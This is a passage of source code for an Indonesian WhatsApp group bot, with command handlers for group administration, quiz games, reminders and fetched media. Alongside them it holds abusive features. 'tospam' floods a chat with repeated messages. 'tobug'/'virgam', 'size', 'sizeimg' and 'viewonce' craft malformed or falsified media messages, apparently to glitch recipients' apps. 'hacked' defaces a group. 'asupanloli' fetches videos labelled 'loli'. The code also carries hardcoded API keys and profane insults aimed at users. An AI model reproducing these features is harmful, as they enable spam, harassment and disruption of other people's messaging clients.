                    limitAdd(sender, limit)
                    })
                    .catch((err) => {                            
                            reply('erorr')
                        })            
            break
      case "getbio":
      if (isBanned) return reply(mess.ban)
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await itsmevall.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          itsmevall.contacts[ambl] != undefined
            ? itsmevall.contacts[ambl].sname || itsmevall.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        itsmevall.groupUpdateDescription(from, `${args.join(" ")}`);
        itsmevall.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        itsmevall.groupUpdateSubject(from, `${args.join(" ")}`);
        itsmevall.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
        if (!isGroup) return;
        ppUrl = await itsmevall.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        itsmevall.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
        });
        break;            
      case "closegc":
      if (isBanned) return reply(mess.ban)
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        itsmevall.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;                          
        case 'cek':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Matahari tenggelam di sebelah…?..

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `ck`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
case 'asupanloli':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
reply(mess.wait)
buffer = await getBuffer(`https://api.zacros.my.id/asupan/loli`)
buttons = [{buttonId: `asupanloli`,buttonText:{displayText: `➡️Next`},type:1}]
              videoMsg = (await itsmevall.prepareMessageMedia(buffer, "videoMessage", { thumbnail: buffer, })).videoMessage
              buttonsMessage = {footerText:'klik button di bawah untuk vedeo selanjutnya', videoMessage: videoMsg,
              contentText:`Random Asupan`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
              break        
case 'asupan':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
reply(mess.wait)
buffer = await getBuffer(`https://api.zacros.my.id/asupan/random`)
buttons = [{buttonId: `asupan`,buttonText:{displayText: `➡️Next`},type:1}]
              videoMsg = (await itsmevall.prepareMessageMedia(buffer, "videoMessage", { thumbnail: buffer, })).videoMessage
              buttonsMessage = {footerText:'klik button di bawah untuk vedeo selanjutnya', videoMessage: videoMsg,
              contentText:`Random Asupan`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)              
              break
               case 'asupangeayubi':
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             if (isBanned) return reply(mess.ban)
             reply(mess.wait)
             const geayubi = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/geayubi?apikey=Alphabot`)
             buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
             videoMsg = (await itsmevall.prepareMessageMedia(geayubi, "videoMessage", { thumbnail: geayubi, })).videoMessage
              buttonsMessage = {footerText:'KLIK NEXT UNTUK SELANJUTNYA', videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
              break
             case 'asupanaura':             
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             if (isBanned) return reply(mess.ban)
             reply(mess.wait)
             const naura = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/aura?apikey=${AlphaBot}`)
             buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
             videoMsg = (await itsmevall.prepareMessageMedia(naura, "videoMessage", { thumbnail: naura, })).videoMessage
              buttonsMessage = {footerText:'KLIK NEXT UNTUK SELANJUTNYA', videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
              break
            case 'asupanbunga':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             if (isBanned) return reply(mess.ban)
            reply(mess.wait)
            const bunga = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/bunga?apikey=${AlphaBot}`)
             buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await itsmevall.prepareMessageMedia(bunga, "videoMessage", { thumbnail: bunga, })).videoMessage
              buttonsMessage = {footerText:'KLIK NEXT UNTUK SELANJUTNYA', videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
              break
            case 'asupanayu':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             if (isBanned) return reply(mess.ban)
            reply(mess.wait)
            const ayu = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/ayu?apikey=${AlphaBot}`)
             buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
             videoMsg = (await itsmevall.prepareMessageMedia(ayu, "videoMessage", { thumbnail: ayu, })).videoMessage
              buttonsMessage = {footerText:'KLIK NEXT UNTUK SELANJUTNYA', videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
              break
             case 'asupancaca':
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             if (isBanned) return reply(mess.ban)
             reply(mess.wait)
             const caca = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/delvira?apikey=${AlphaBot}`)
             buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await itsmevall.prepareMessageMedia(caca, "videoMessage", { thumbnail: caca, })).videoMessage
              buttonsMessage = {footerText:'KLIK NEXT UNTUK SELANJUTNYA', videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
              break
        case 'ck':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Makanan yang dibungkus daun pisang?.

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `cok`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'tovirgam':
  case 'jadivirgam':
    case 'tobug':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)    
if (isBanned) return reply(mess.ban)    
if (!isOwner && !mek.key.fromMe) return reply('Only Owner')    
if (!isQuotedSticker) return reply(' reply sticker Yang mau dijadikan Virgam anjeng')
reply(mess.wait)
const virgamnye = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
virgamm = await itsmevall.downloadAndSaveMediaMessage(virgamnye, './media/sampah')
ran = getRandom('.png')
exec(`ffmpeg -i ${virgamm} ${ran}`, (err) => {
fs.unlinkSync(virgamm)
if (err) return reply('BABI KALI KAU, VIRGAM = VIRUS GAMBAR, NAH GAMBAR EMANG ADA YANG BERGERAK? TOLOL..!!')
buffer = fs.readFileSync(ran)
itsmevall.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: '🥶ALYA✓CHAN🥶'})
fs.unlinkSync(ran)
})
limitAdd(sender, limit)
break
        case 'cok':
        case 'susunkata':
        case 'asahotak':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Apabila mengendarai mobil wajib bawa.

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `c`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'c':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Jangan membuang tisu di….

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `lol`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;        
        case 'lol':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Hewan yang berubah warna kalau ada musuhnya?.

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `ceklontong`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'tebakanime':
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    itsmevall.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    limitAdd(sender, limit)
                    break        
        case 'tebaklirik':
              if (!isRegistered && !itsMe && !isOwner) return reply(`Limit game kamu sudah habis`)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/lirik`, {method: 'get'})
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              itsmevall.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
              await sleep(30000)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaklirik[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
              gameAdd(sender, glimit)
              break
              case 'logoepep5': 
				gatauda = body.slice(10)
                 if (!isRegistered) return reply( ind.noregis())			
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/logoff?hero=Kla&text=${gatauda}&apikey=RanddyGanz`, {method: 'get'})
				itsmevall.sendMessage(from, buffer, image, {quoted: faketroli, caption: 'Nih hasilnya kak...'})
				await limitAdd(sender)
				break
        case 'tebaktebakan':
        if (isBanned) return reply(mess.ban)
              if (!isRegistered && !itsMe && !isOwner) return reply(`Limit game kamu sudah habis`)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebaktebakan?apikey=beta`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.soal
              itsmevall.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply }).then(() => {
              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
})
              await sleep(30000)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game`, [
          {
            buttonId: `${prefix}tebaktebakan`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebaktebakan[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
}
              gameAdd(sender, glimit)
              break                            
        case "tebakgambar":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebakgambar?apikey=beta`)
   gambar = await getBuffer(anu.result.images)
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 60000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_60 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   itsmevall.sendMessage(from, gambar, image, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   limitAdd(sender, limit)
   break
               case 'del':
				case 'delete':
				if (isBanned) return reply(mess.ban)
				 if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
					itsmevall.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
case 'tospam':
if (isBanned) return reply(mess.ban)
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  itsmevall.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  itsmevall.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await itsmevall.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  itsmevall.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await itsmevall.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  itsmevall.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await itsmevall.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  itsmevall.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        itsmevall.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        itsmevall.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await itsmevall.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              itsmevall.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await itsmevall.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              itsmevall.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              itsmevall.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await itsmevall.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              itsmevall.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await itsmevall.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              itsmevall.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              itsmevall.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;        
case 'hacked':
  if (!mek.key.fromMe) return;
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   itsmevall.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                itsmevall.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                itsmevall.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                itsmevall.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
case 'mygithub':
  reply('Apa Goblok')
					break;       
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await itsmevall.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:fgif})
itsmevall.relayWAMessage(costick)
break

case 'sizeimg':
if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await itsmevall.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:ftroli})
itsmevall.relayWAMessage(costick3)
break
case 'jadibot':
      case "[jadibot]":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (!mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, itsmevall, from);
        limitAdd(sender, limit)
        break;
      case "stopjadibot":
        if (!mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listjadibot":
      case "listbot":
        return reply(' Jummlah jadi bot di bot ini : username : @miyoga/@NEKO BOT/@bukan bot bwang/@loli jembot/@dika-bot')
        break

      //------------------< Fitur yg pake button >-------------------
      
	case 'chat':
			if (args[0].startsWith('08')) return grupinv('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return grupinv('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            itsmevall.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'viewonce':
res = await itsmevall.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": iye,
"viewOnce": true
}
}
}
}, {}) 
itsmevall.relayWAMessage(res)
break
case 'hbd': 
case 'zodiak': 
case 'zodiac':
let textus = args.join(" ")
if (!q) return reply(`Example : ${prefix + command} 2003 01 24`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const okbg = new Date(textus)
if (okbg == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(monospace(teksh))
break
// debug
  case 'debug':
			 res = await itsmevall.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
